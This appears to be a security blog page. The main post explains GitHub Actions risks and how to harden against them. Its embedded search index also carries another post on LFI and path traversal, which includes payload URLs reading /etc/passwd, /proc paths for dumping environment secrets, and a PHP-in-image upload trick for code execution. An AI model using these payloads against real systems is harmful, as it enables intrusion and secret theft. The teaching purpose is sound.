<!DOCTYPE html>
<html>

<head><meta charset="UTF-8">
<meta http-equiv="Cache-control" content="public">

<link rel="apple-touch-icon" sizes="180x180" href="https://thesecurityvault.com/favicon/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://thesecurityvault.com/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://thesecurityvault.com/favicon/favicon-16x16.png">
<link rel="manifest" href="https://thesecurityvault.com/site.webmanifest">

<title>Securing Github Actions</title>

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta property="description"
  content="Github actions are being used to build and deploy solutions, with privileged accesses, but its security is being ignored. Lets change that" />

<meta property="keywords"
  content='actions, github, hardening, securing, workflows, security' />

<meta name="author" content="Luis Fontes">




<script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "articleSection": "posts",
    "name": "Securing Github Actions",
    "headline": "Securing Github Actions",
    "alternativeHeadline": "",
    "description": "Github actions are being used to build and deploy solutions, with privileged accesses, but its security is being ignored. Lets change that",
    "inLanguage": "en-us",
    "isFamilyFriendly": "true",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https:\/\/thesecurityvault.com\/securing-github-actions\/"
    },
    "author" : {
        "@type": "Person",
        "name": "map[avatar:\/img\/luisfontes19.jpg bio:After 5 years working with different technologies as full stack developer I changed to the AppSec world. Worked at checkmarx and huge global customers reviewing application\u0027s source code to find and help mitigate its vulnerabilities. From there changed to IOVLabs (RSK) and the crypto currency world. Nowadays I work at a Xapo, a crypto bank. jobTitle:Application Security Engineer | eMAPT | eWPTXv2 name:Luís Fontes username:luisfontes19]"
    },
    "creator" : {
        "@type": "Person",
        "name": "map[avatar:\/img\/luisfontes19.jpg bio:After 5 years working with different technologies as full stack developer I changed to the AppSec world. Worked at checkmarx and huge global customers reviewing application\u0027s source code to find and help mitigate its vulnerabilities. From there changed to IOVLabs (RSK) and the crypto currency world. Nowadays I work at a Xapo, a crypto bank. jobTitle:Application Security Engineer | eMAPT | eWPTXv2 name:Luís Fontes username:luisfontes19]"
    },
    "accountablePerson" : {
        "@type": "Person",
        "name": "map[avatar:\/img\/luisfontes19.jpg bio:After 5 years working with different technologies as full stack developer I changed to the AppSec world. Worked at checkmarx and huge global customers reviewing application\u0027s source code to find and help mitigate its vulnerabilities. From there changed to IOVLabs (RSK) and the crypto currency world. Nowadays I work at a Xapo, a crypto bank. jobTitle:Application Security Engineer | eMAPT | eWPTXv2 name:Luís Fontes username:luisfontes19]"
    },
    "copyrightHolder" : "The Security Vault",
    "copyrightYear" : "2022",
    "dateCreated": "2022-02-19T00:15:40.57Z",
    "datePublished": "2022-02-19T00:15:40.57Z",
    "dateModified": "2022-02-20T15:37:27.21Z",
    "publisher":{
        "@type":"Organization",
        "name": "The Security Vault",
        "url": "https://thesecurityvault.com",
        "logo": {
            "@type": "ImageObject",
            "url": "https:\/\/thesecurityvault.com\/img\/logo.png",
            "width":"32",
            "height":"32"
        }
    },
    "image": "https://thesecurityvault.com/img/logo.png",
    "url" : "https:\/\/thesecurityvault.com\/securing-github-actions\/",
    "wordCount" : "2019",
    "genre" : [ "actions" , "github" , "hardening" , "securing" , "workflows" , "security" ],
    "keywords" : [ "actions" , "github" , "hardening" , "securing" , "workflows" , "security" ],
}
</script>



<meta property="og:title" content="Securing Github Actions" />
<meta property="og:description"
  content="Github actions are being used to build and deploy solutions, with privileged accesses, but its security is being ignored. Lets change that" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://thesecurityvault.com/securing-github-actions/" /><meta property="og:image" content="https://thesecurityvault.com/securing-github-actions/images/banner.png" /><meta property="article:section" content="posts" />

<meta property="article:published_time" content="2022-02-19T00:15:40+00:00" />

<meta property="article:modified_time" content="2022-02-20T15:37:27+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://thesecurityvault.comimages/banner.png" /><meta name="twitter:title" content="Securing Github Actions" />
<meta name="twitter:description"
  content="Github actions are being used to build and deploy solutions, with privileged accesses, but its security is being ignored. Lets change that" />


<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=DM+Sans&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@700&family=Roboto:ital,wght@1,900&display=swap"
  rel="stylesheet">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/fontawesome.min.css"
  integrity="sha384-jLKHWM3JRmfMU0A5x5AkjWkw/EYfGUAGagvnfryNV3F9VqM98XiIH7VBGVoxVSc7" crossorigin="anonymous">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css"
  integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous">
<link rel="stylesheet" href="https://thesecurityvault.com/css/styles.05f55bf2d99a4c2ad028114e2428922e57b8f7315b66d8b3014284f0d0782c2e067c19ff28d3c2d8a47ddce1a97fae77227c3b423e4eaf1d1b887510168664f8.css">



<script>
  console.log("Hmm wait, what?!")
  console.log("77 90 26 59 64 81 81 84 12 89 12 82 80 43 83");
  console.log("14 6  8  10 1  3  12 2  4  11 9  2  7  5  13");
  console.log("Should add 20")
</script></head>

<body><section id="header" class="header-alt"></section>
<section class="container-fluid menu-container">
  <div>
    <nav id="navbar" class="navbar navbar-expand-lg navbar-default sticky" style="z-index:10;">
      <a class="navbarbar-brand" href="/">
        <img src="https://thesecurityvault.com/img/logo.png">
      </a>
      <div style="height:50px;"></div>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#menubar" aria-controls="menubar"
        aria-expanded="false" aria-label="">
        <span class="navbar-toggler-icon">
          <i class="fa fa-bars"></i>
        </span>
      </button>


      <div class="collapse navbar-collapse" id="menubar">
        <div class="navbar-nav mr-auto"></div>

        <ul class="navbar-nav">
          
          <li class="nav-item">
            <a class="nav-link" href="/">
              Home
            </a>
          </li>
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">
              About me
            </a>
          </li>
          
          <li>
            <input id="search" class="form-control search-input" type="search" placeholder="Search" aria-label="Search">
            </form>
          </li>
        </ul>
        <div class="form-inline">


        </div>
      </div>

    </nav>
  </div>
</section>


<div class="container">
  <div class="page">
    <section class="single-post">

      <img class="single-post-image" src="https://thesecurityvault.com/securing-github-actions/images/banner.png" />
      <div class="">
        <div class="single-post-header text-center">
          <h1>Securing Github Actions</h1>
          <div class="single-post-details text-secondary">
            <ul>
              <li><a href="">luisfontes19</a></li>
              <li>Feb 19, 2022</li>
              <li class="text-secondary">10 minutes</li>
              
              <li>appsec</li>
            </ul>
          </div>
        </div>

        <div class="single-post-content">
          <p>Github actions are a thing more and more common nowadays, and I have to admit, I love them. But the security of Github Actions are usually ignored. In this post I&rsquo;ll go through some of common flows and issues, and see some preventions</p>
<h2 id="terminology">Terminology</h2>
<p>First its important to understand the terminologies used as the naming convention chosen by github may be misleading.</p>
<ul>
<li><strong>Github Actions</strong> is the name for the feature</li>
<li>A <strong>Step</strong> is a small set of operations in a job. A step can be for example calling an action, or running bash code.</li>
<li>An <strong>Action</strong> is a set of steps combined to do an operation. An action is the smallest reusable block, that can be exported and invoked from other jobs.</li>
<li>A <strong>Job</strong> is a set of steps and actions, that you can define to run on a specific environment</li>
<li>Finally, a <strong>workflow</strong> is a set of jobs, represented in a yml file that trigger on a specified event.</li>
</ul>
<h2 id="github-actions-overview">Github Actions overview</h2>
<p>Github Actions are an awesome way of creating CI/CD pipelines on github. Developers can easily create .yml files to configure workflows and perform common tasks like running tests or create builds.</p>
<p>You can use also use javascript (and other languages) to create a more complex Action.</p>
<p>Github Actions are used to deploy code, run tests, run SAST scans, run linters, create final product builds, block the pipelines for approvals, and basically anything that you can remember.</p>
<p>Let&rsquo;s see some of the possible security issues with Github Actions</p>
<h2 id="possible-issues">Possible issues</h2>
<ol>
<li><a href="#secrets-leak">Secrets Leak</a></li>
<li><a href="#workflow-manipulation">Workflow manipulation</a></li>
<li><a href="#workflow-with-write-permissions">Workflow with write permissions</a></li>
<li><a href="#third-party-action-abuse">Third-Party Actions abuse</a></li>
<li><a href="#pull-request-review-bypass">Pull Request Review Bypass</a></li>
<li><a href="#custom-runners">Custom Runners</a></li>
<li><a href="#billing">Billing Issues</a></li>
<li><a href="#required-status-checks-to-pass">Required status checks to pass</a></li>
</ol>
<h3 id="secrets-leak">Secrets Leak</h3>
<p>Using the secrets feature may give you a false sense of security.</p>
<p>Although github does some filtering on the workflow output to prevent secrets from being leaked, this routine is basically a simple search and replace. Secrets can still be printed to the workflow log if you base64 encode it for example, or if you reverse the string, or if you print one char at a time (and many other ways).</p>
<p>Having this chained with <a href="#workflow-manipulation">Workflow Manipulation</a> and you get a serious thing.</p>
<p>This does not impact only public repos, but also private organizational repositories with global secrets configured.</p>
<h3 id="workflow-manipulation">Workflow Manipulation</h3>
<p>There are multiple ways developers can change a workflow. For example, in an organization users can edit the actions of any repo they have write access to.</p>
<p>The scary thing about it is that if you add/change a workflow in your branch and the right conditions are met for the action to be <a href="https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows">triggered</a> it will trigger the changed workflow from your branch and not the one on the default branch or de previous one before your commits.</p>
<p>On public repositories that&rsquo;s also tricky.</p>
<p>If a developer does a fork of your project the workflows running on his fork won&rsquo;t use any of your secrets, and they can even fail until the developer configures the secrets in his fork.</p>
<p>But if he does a Pull Request things change a bit.</p>
<p>By default, github only requires an approval for first time contributors to the repo. This means that a workflow run needs to be manually approved for new contributors.</p>
<p><img src="images/first_time_contributor.jpg" alt="First time contributors need approval to run workflow"></p>
<p>But after the first contribution (a PR to be merged) the developer can run the workflows automatically, which means he can change the code to dump secrets for example, do the PR and it will run.</p>
<p>If you have linters or sast tools that you want to run before merging PR&rsquo;s this can be problematic.</p>
<p>There are malicious users that do simple PR&rsquo;s to fix typos or formatting issues on open source repos so that the owners of the repo approve them to run the workflow. After that he is free to run the workflows as he wants to.</p>
<p>To secure yourself from this, consider one of the options:</p>
<ol>
<li>Configure workflows to need manually approval for all runs (<a href="https://docs.github.com/en/actions/managing-workflow-runs/approving-workflow-runs-from-public-forks">docs</a>)</li>
<li>Allow any user to run any action but the ones that need sensitive fields make them manually triggered, passing the sensitive information as param inputs.</li>
<li><a href="#environments">Configure environments</a></li>
</ol>
<p>If you&rsquo;re running workflows under an organization you have an org wide setting to disable workflows to run from pull requests from forked repos. This helps preventing repo specific secrets from getting leaked tby other organization members that do not have write permissions to the repository.</p>
<p><img src="images/fork_workflow_pull_request.jpg" alt="Fork pull request workflows in private repositories"></p>
<p>Tip: You can also disable forks from organization&rsquo;s repositories.</p>
<h3 id="workflow-with-write-permissions">Workflow with write permissions</h3>
<p>When running a workflow, github generates a temporary token (GITHUB_TOKEN) that lives only for the time of the running of the workflow. This token has by default read and write permissions to the repository and can be accessed by any action/step.</p>
<p>So, if you use <em>random</em> actions from the <a href="https://github.com/marketplace?type=actions">Github Marketplace</a> the actions also have access to this token so be careful.</p>
<p>You should restrict the permissions of the GITHUB_TOKEN, in case you don&rsquo;t need writing permissions. (<a href="https://docs.github.com/en/actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token">docs</a>)</p>
<h4 id="environments">Environments</h4>
<p>Github environments can also contain secrets, and jobs that use environments need first to pass all protections to run. This means that environment secrets are only exposed after passing these protections.</p>
<p><img src="images/environments.jpg" alt="Github environments"></p>
<p>You can require people to approve a workflow to run, and only make it run after X hours, which can add some time for relevant people see if something is wrong.</p>
<p>Also, you can restrict which branches can trigger the environment, so if you have a strict master branch protection, where it can only be merged by pull request (no direct pushes), and x reviewers, you can restrict an environment to run on master for example, which adds a good extra security.</p>
<h3 id="third-party-action-abuse">Third-Party Action abuse</h3>
<p>Good news. 3rd party actions cannot access your secrets variable&hellip; But they can access the GITHUB_TOKEN.</p>
<p>Good safety preventions for this are to set the GITHUB_TOKEN has as <a href="#workflow-with-write-permissions">ready only</a> and to <a href="https://github.blog/changelog/2021-04-20-github-actions-control-permissions-for-github_token/">specify which specific permissions</a> the workflow will have when running.</p>
<p>Remember that when you use 3rd party actions on most of the cases they will have access to you code as you probably did a checkout before, and even if you didn&rsquo;t the action can do it with the GITHUB_TOKEN. If you have a private repo a malicious extension can easily exfiltrate your code.</p>
<p>Nowadays there&rsquo;s a trendy term for this: <strong>Supply Chain Attack</strong></p>
<p>To prevent malicious abuse of the 3rd party actions review the code of the action in the marketplace, and hardcode the hash of the commit reviewed, when using the action on your workflow.</p>
<p>Otherwise an action author can release a new malicious update or delete a specific version and push the same version tag with different code. Using commit hashes prevents possible issues on your side.</p>
<p>Ex:</p>
<div class="highlight"><div style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="1"><a style="outline: none; text-decoration:none; color:inherit" href="#1">1</a>
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="2"><a style="outline: none; text-decoration:none; color:inherit" href="#2">2</a>
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="3"><a style="outline: none; text-decoration:none; color:inherit" href="#3">3</a>
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="4"><a style="outline: none; text-decoration:none; color:inherit" href="#4">4</a>
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="5"><a style="outline: none; text-decoration:none; color:inherit" href="#5">5</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#000">...</span><span style="color:#f8f8f8;text-decoration:underline">
</span><span style="color:#f8f8f8;text-decoration:underline"></span><span style="color:#204a87;font-weight:bold">steps</span><span style="color:#000;font-weight:bold">:</span><span style="color:#f8f8f8;text-decoration:underline">
</span><span style="color:#f8f8f8;text-decoration:underline">  </span>- <span style="color:#204a87;font-weight:bold">name</span><span style="color:#000;font-weight:bold">:</span><span style="color:#f8f8f8;text-decoration:underline"> </span><span style="color:#4e9a06">&#34;Checkout code&#34;</span><span style="color:#f8f8f8;text-decoration:underline">
</span><span style="color:#f8f8f8;text-decoration:underline">    </span><span style="color:#204a87;font-weight:bold">uses</span><span style="color:#000;font-weight:bold">:</span><span style="color:#f8f8f8;text-decoration:underline"> </span><span style="color:#000">actions/checkout@ec3a7ce113134d7a93b817d10a8272cb61118579</span><span style="color:#f8f8f8;text-decoration:underline"> </span><span style="color:#8f5902;font-style:italic"># v2.4.0</span><span style="color:#f8f8f8;text-decoration:underline">
</span><span style="color:#f8f8f8;text-decoration:underline"></span><span style="color:#000">...</span><span style="color:#f8f8f8;text-decoration:underline">
</span></code></pre></td></tr></table>
</div>
</div><p>Also, github provides a configuration to specify which kind of actions can be run in an org/repo.</p>
<p>You can choose to disable Github Actions, to allow any action to run, local actions only (from the same org or the same repo) or even go into more detail and specify action names or even commit hashes</p>
<h3 id="pull-request-review-bypass">Pull Request Review Bypass</h3>
<p>Another interesting attack vector is by using the GITHUB_TOKEN to approve a PR. Since this token does not represent the user that trigger the event, using the token to approve a PR will just work.</p>
<p>If you only need 1 (more) approval to merge a PR, then you can easily do it with this flow. You can read more about this vulnerability in the eyes of the researchers who found it, <a href="https://medium.com/cider-sec/bypassing-required-reviews-using-github-actions-6e1b29135cc7">here</a></p>
<p>Meanwhile github added a new setting to help preventing this issue for organizations:</p>
<p><img src="images/allow_action_approve_pr.jpg" alt="Allow GitHub Actions to approve pull requests"></p>
<p>This setting is enabled by default in new repos, but repos created before the feature was introduced have it disabled.</p>
<p>Some other recommendations online for this issue, is to increase the number of reviewers, but depending on your settings this may not be enough. For example if you don&rsquo;t need a new approval after a code change, when you get number_of_required_approvals - 1 you can change the pull request and the action to approve it.</p>
<p>So for that recommendation to work, you need to enable the option &ldquo;Dismiss stale pull request approvals when new commits are pushed&rdquo; on the branch protection rules:</p>
<p><img src="images/dismiss_stale_pr.jpg" alt="Dismiss stale pull request approvals when new commits are pushed"></p>
<p>And as a precaution add at least 3 reviewers instead of 2. So that you have at least two real reviewers.</p>
<h3 id="custom-runners">Custom Runners</h3>
<p>Workflows run in Runners. A runner is a container, and you can chose from a few different ones, being the most common ubuntu.</p>
<p>A lot of organizations use custom runners, inside AWS for example, with privileged accesses to organization assets. This is done for example to do deployments.</p>
<p>The issue with this is as we saw before in <a href="#workflow-manipulation">Workflow Manipulation</a> if somebody changes the action they have privilege access to everything the runner has as well.</p>
<p>On a private repo, as a rule of thumb do not use custom runners with more access then the users on that repo</p>
<h3 id="billing">Billing</h3>
<p>Github actions are not free. For each different plan, github offers an amount of minutes and space for workflows. When that time or space comes to an end new costs are billed. This can be exploited to make workflows run for big amounts of time and a lot of times and eventually to increase the billing.</p>
<p>Check the storage and minutes for each plan <a href="https://docs.github.com/en/billing/managing-billing-for-github-actions/about-billing-for-github-actions">here</a></p>
<h3 id="required-status-checks-to-pass">Required status checks to pass</h3>
<p>Branch protections have an option to require status checks to pass before merging PR&rsquo;s. This means that the workflows need to successfully pass first.</p>
<p><img src="images/require_status_checks.jpg" alt="Require status checks before merging"></p>
<p>Repository/Organization admins may rely on this feature to try to add some security, trying to force workflows to succeed on some checks, before merging. But this gives a false sense of security. As we saw before in <a href="#workflow-manipulation">Workflow Manipulation</a> a developer can change the workflow to always pass, bypassing then this configuration.</p>
<p>A workaround for this is to force multiple approvals (I recommend 2 if github actions <a href="#pull-request-review-bypass">cannot approve PR&rsquo;s</a>). This way, although the user changes the workflow to pass the checks, the reviewers of the pull request will see the change in the workflow and can reject the PR.</p>
<h2 id="key-takeaways">Key Takeaways</h2>
<ul>
<li>Github actions are trending now, but do you really need a workflow? Is it the best option for you need?</li>
<li>Secrets can be accessed by anybody with write access to a repo</li>
<li>Secrets can be accessed by external repo users
<ul>
<li>By default, developers can run actions at will after first contribution, change the setting to always need manual approval (if you have secrets or privileged flows)</li>
<li>Are you doing a deployment? Use a webhook instead to trigger a flow in a more restricted environment, or configure restricted github environments</li>
</ul>
</li>
<li>Avoid organization&rsquo;s wide secrets, anybody with permissions to create/write to a repo can extract them</li>
<li>Avoid 3rd party action. You can enable options to only allow github&rsquo;s, verified  or internal actions to run.</li>
<li>When using external actions review the source code first, and pin them to a specific commit hash to make sure there were no changes.</li>
<li>Limit the workflow permissions</li>
<li>Remove default GITHUB_TOKEN write permissions if not needed</li>
<li>Block actions from approving pull requests on older repos</li>
<li>Do not make available custom runners that have access to more things then the developers</li>
<li>Change &ldquo;Fork pull request workflows from outside collaborators&rdquo; to &ldquo;Require approval for all outside collaborators&rdquo; for public or sensitive repos if you have configured secrets</li>
<li>Do not rely on &ldquo;Require status checks to pass before merging&rdquo; if developers can change the actions</li>
<li>Disable the permission for github actions to approve PR&rsquo;s</li>
<li>Use at least 2 reviewers for PR&rsquo;s and block push to master</li>
</ul>
<h2 id="other-docs">Other docs</h2>
<p>If you are writing github actions, i&rsquo;ll leave here some documentation pages that were very helpful to me:</p>
<ul>
<li><a href="https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows">Workflow Triggers</a> - Events that can trigger a workflow</li>
<li><a href="https://docs.github.com/en/actions/learn-github-actions/environment-variables">Env Variables</a> - Environment variables available when running bash</li>
<li><a href="https://docs.github.com/en/actions/learn-github-actions/contexts">Contexts</a> - The context structure and all fields</li>
<li><a href="https://docs.github.com/en/actions/learn-github-actions/expressions">Expressions</a> - Expressions to use in the yaml file like operators and functions</li>
<li><a href="https://github.com/actions/github-script">Github Script</a> - Run inline javascript code in the the yaml file</li>
<li><a href="https://github.com/actions/upload-artifact">Upload artifact</a> - Action to upload artifacts generated in the workflow</li>
<li><a href="https://github.com/github/codeql-action">CodeQL Action</a> - CodeQL Action and Sarif uploads</li>
</ul>


          
        </div>
      </div>

      <div class="challange1">
        <div class="d-none  d-sm-none d-md-block">
          ClZHaGxVMlZqZFhKcGRIbFdZWFZzZEVobGNrWnZjbGx2ZFZSb1pWTmxZM1ZwZEhsV1lYVnNkRWhsY21WR2IzSlpiM1ZVYUdWVFkzVnlhWFI1Vm1GMWJIUklaWEpsUm05eVdXOTFWR2hsVTJWamRYSnBkSGxXWVhWc2RFaGxaVVp2Y2xsdmRWUm9aVk5qZFhKcGRIbFdZWFZzZEVobGNtVkdiM0paYjNWVWFGTmxZM1Z5YVhSNVZtRjFiSFJJWlhKbFJtOXlXVzkxVkdobFUyVmpkWEpwZEhsV1lYVnNkRWhsY21WdmNsbHZkVlJvWlZObFkzVnlhWFI1Vm1GMWJIUkljbVZHYjNKWmIzVlVhR1ZUWldOMWNuUjVWbUYxYkhSSVpYSmxSbTl5V1c5MVZHaGxVMlZqZFhKcGRIbFdZWFZzZEVobGNrWnZjbGx2ZFZSb1pWTmxZM1Z5YVhSNVZtRjFiSFJJWlhKbFJtOXlXWFZVYUdWVFpXTjFjbWwwZVZaaGRXeDBTR1Z5WlVaeVdXOTFhR1ZUWldOMWNtbDBlVlpoZFd4MFNHVnlaVVp2Y2xsdmRWUm9aVk5sWTNWeWFYUjVWbUYxYkhSSVpYSmxiM0paYjNWVWFHVlRaV04xY21sMGVXRjFiSFJJWlhKbFJtOXlXVzkxVkdobFUyVmpkWEpwZEhsV1lYVnNkRWhsY2tadmNsbHZkUT09
        </div>
      </div>
    </section>



  </div>

  <div class="single-post-pagination">
    <div class="row post-pagination">
      <div class="col-md-6 previous-post">
        
        <a href="https://thesecurityvault.com/we-are-making-authentication-systems-wrong/">&lArr; Previous Post<br><b>We are making authentication systems wrong</b></a>
        
      </div>
      <div class="col-md-6 next-post">
        
        <a href="https://thesecurityvault.com/path-traversal-lfi-can-be-worst-than-you-think/"> Next Post &rArr;<br><b>Path Traversal &amp; LFI can be worst than you think</b></a>
        
      </div>
    </div>
  </div>
</div><script>

window.searchIndex = {
    
    
    
    
    "https:\/\/thesecurityvault.com\/path-traversal-lfi-can-be-worst-than-you-think\/": {
        
        "title": "Path Traversal \u0026 LFI can be worst than you think",
        "tags": [],
        "content": "LFI and Path traversal are not a new thing, but what most people don\u0026rsquo;t understand is the full impact of the vulnerability.\nIn this post I\u0026rsquo;ll cover different attack scenarios when exploiting a LFI vulnerability, like enumerating process, dumping environment variables, and on more extreme cases remote code execution (RCE).\nLFI Recap This type of attack happens when the application loads a file from the the filesystem and somehow the user can exploit this behavior to load unintended files and eventually retrieve its content.\nThe following code snippet is a common example of a LFI vulnerability:\n1 2 3 4 5 6 7  \u0026lt;?php $file = $_GET[\u0026#39;file\u0026#39;]; if(isset($file)) include(\u0026#34;pages/$file\u0026#34;); else include(\u0026#34;index.php\u0026#34;); ?\u0026gt;  To exploit this scenario one could just manipulate the file param to read a random file like so:\n1  https://example.com?file=../../../../../../etc   Enumeration When you find a LFI you can start retrieving some common files to get some basic information about the system. Here\u0026rsquo;s a short list of the most common ones:\n /etc/passwd /etc/crontab /proc/mounts /etc/issue /etc/resolv.conf /etc/hostname /etc/crontab\u0026quot; /etc/group  The /proc folder Lets now see some more advanced exploit techniques, starting with the Linux\u0026rsquo;s /proc folder. This is where a lot of magic happens in the Linux system.\nI will not get too much into the details of /proc as it is a bit complex, but I recommend you dig deeper about it. For the moment let\u0026rsquo;s just say that in /proc you can \u0026ldquo;query\u0026rdquo; the OS for some resources about the machine/OS and the running processes.\nLets see a simple example:\n1 2  $ cat /proc/version Linux version 5.4.0-1062-azure (buildd@lgw01-amd64-007) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #65~18.04.1-Ubuntu SMP Tue Oct 12 11:26:28 UTC 2021   We can leverage the virtual files in /proc with LFI to enumerate a lot of things of a running server.\nHere\u0026rsquo;s a list of some of the most interesting:\n /proc/version - OS Version /proc/net/tcp - open TCP ports /proc/net/udp - open UDP ports /proc/sched_debug - can be used to retrieve running processes /proc/mounts - Mounted devices /proc/[PID]/cmdline - command line that triggered the running process /proc/[PID]/environ - environment variables accessible to the process /proc/[PID]/cwd - current working directory of the process /proc/[PID]/fd/[n] - files opened by the process /proc/[PID]/exe - link to the executable file  If /proc/sched_debug is not available we can create a simple script to loop over a set of possible process ID\u0026rsquo;s and you can get the maximum process id by querying /proc/sys/kernel/pid_max\nIf we are trying to enumerate the running process Linux exposes the self keyword that can be used instead of a process id:\n /proc/self/cmdline /proc/self/environ /proc/self/cwd /proc/self/fd/[n] /proc/self/exe  Have in mind that when using this technique you can only see the same information that the process is running has permissions to.\nDumping Secrets Hardcoded passwords finally have some attention nowadays, unfortunately a common way to fix it is by using environment variables. This is used a lot when dealing with docker containers for example.\nUsing a LFI with /proc/[PID]/environ we can leverage an attacker to dump secrets from running processes, including from the current web application.\nThe best approach is to use a secret manager like Hashicorp\u0026rsquo;s Vault or AWS Secrets Manager. This way your secrets are stored safely and when you retrieve them they only need to be kept in memory while the app runs.\nBonus Tip: Don\u0026rsquo;t trust your secrets directly to these services, instead, encrypt them before storing them in the secret manager. You can keep the key to decrypt it in the code or env var or config file as this is just an extra security layer, like peppering when doing an hash.\nRemote Code Execution (RCE) Local file inclusion can in some cases also result in a RCE. This will depend on the technology stack used by the server as well as some of the features and configurations available.\nHaving in mind the code sample from above, the php code will include a file passed as parameter.\nAs you may have noticed already, this is not restricted to php only files. PHP will include any file type and if it’s not a php file will just render its content, but if it has php enclosure tags it will interpret it.\nWe can leverage this behavior to include a malicious uploaded file, in case the application offers this feature.\nThis usually works because applications tend to do a poor file upload validation by just checking the right file extension or mine type.\nTo exploit this we can create a simple php code (or use a php web shell for example) and save it with a .jpg extension (in case the application accepts this extension).\nExample:\n1 2  // some-image.jpg \u0026lt;?php echo \u0026#39;test\u0026#39;;?\u0026gt;  The file will usually pass validations and we can then do a LFi to the file we just uploaded. As it is PHP code it will be interpreted and our code will run.\nHave in mind that this extension confusion is not PHP specific. For example Node has the same issue, as allows to require any file extension. Python on the other hand doesn\u0026rsquo;t allow this using the regular import directive as the file would need to be a .py file, but there are other ways to import files that will not have this constraint.\nIf the application doesn’t offer an upload feature you may try to do a file inclusion to a remote file. This only works if a specific config is enabled\nThere are other attack methods like exploring php wrappers.\nLeveraging protocols and wrappers Keeping up with a PHP environment, we can leverage PHP supported protocols and wrappers to get some more interesting stuff.\nFor example, if expect is enabled we can leverage it to get code execution as well.\nAn interesting wrapper is the php://filter\nAn example on how to use is:\n1  https://example.com?file=php://filter/convert.base64-encode/resource=/etc/passwd   But have in mind that when using protocols and wrappers you need to have full control of the path being injected. which in the example used at the begining of the document we don\u0026rsquo;t have (it starts with \u0026ldquo;pages/\u0026quot;)\n", 
        "url": "https:\/\/thesecurityvault.com\/path-traversal-lfi-can-be-worst-than-you-think\/",
        "summary": "LFI and Path traversal are not a new thing, but what most people don\u0026rsquo;t understand is the full impact of the vulnerability.\nIn this post I\u0026rsquo;ll cover different attack scenarios when exploiting a LFI vulnerability, like enumerating process, dumping environment variables, and on more extreme …",
        "preview": "https:\/\/thesecurityvault.com\/path-traversal-lfi-can-be-worst-than-you-think\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/securing-github-actions\/": {
        
        "title": "Securing Github Actions",
        "tags": [],
        "content": "Github actions are a thing more and more common nowadays, and I have to admit, I love them. But the security of Github Actions are usually ignored. In this post I\u0026rsquo;ll go through some of common flows and issues, and see some preventions\nTerminology First its important to understand the terminologies used as the naming convention chosen by github may be misleading.\n Github Actions is the name for the feature A Step is a small set of operations in a job. A step can be for example calling an action, or running bash code. An Action is a set of steps combined to do an operation. An action is the smallest reusable block, that can be exported and invoked from other jobs. A Job is a set of steps and actions, that you can define to run on a specific environment Finally, a workflow is a set of jobs, represented in a yml file that trigger on a specified event.  Github Actions overview Github Actions are an awesome way of creating CI/CD pipelines on github. Developers can easily create .yml files to configure workflows and perform common tasks like running tests or create builds.\nYou can use also use javascript (and other languages) to create a more complex Action.\nGithub Actions are used to deploy code, run tests, run SAST scans, run linters, create final product builds, block the pipelines for approvals, and basically anything that you can remember.\nLet\u0026rsquo;s see some of the possible security issues with Github Actions\nPossible issues  Secrets Leak Workflow manipulation Workflow with write permissions Third-Party Actions abuse Pull Request Review Bypass Custom Runners Billing Issues Required status checks to pass  Secrets Leak Using the secrets feature may give you a false sense of security.\nAlthough github does some filtering on the workflow output to prevent secrets from being leaked, this routine is basically a simple search and replace. Secrets can still be printed to the workflow log if you base64 encode it for example, or if you reverse the string, or if you print one char at a time (and many other ways).\nHaving this chained with Workflow Manipulation and you get a serious thing.\nThis does not impact only public repos, but also private organizational repositories with global secrets configured.\nWorkflow Manipulation There are multiple ways developers can change a workflow. For example, in an organization users can edit the actions of any repo they have write access to.\nThe scary thing about it is that if you add/change a workflow in your branch and the right conditions are met for the action to be triggered it will trigger the changed workflow from your branch and not the one on the default branch or de previous one before your commits.\nOn public repositories that\u0026rsquo;s also tricky.\nIf a developer does a fork of your project the workflows running on his fork won\u0026rsquo;t use any of your secrets, and they can even fail until the developer configures the secrets in his fork.\nBut if he does a Pull Request things change a bit.\nBy default, github only requires an approval for first time contributors to the repo. This means that a workflow run needs to be manually approved for new contributors.\nBut after the first contribution (a PR to be merged) the developer can run the workflows automatically, which means he can change the code to 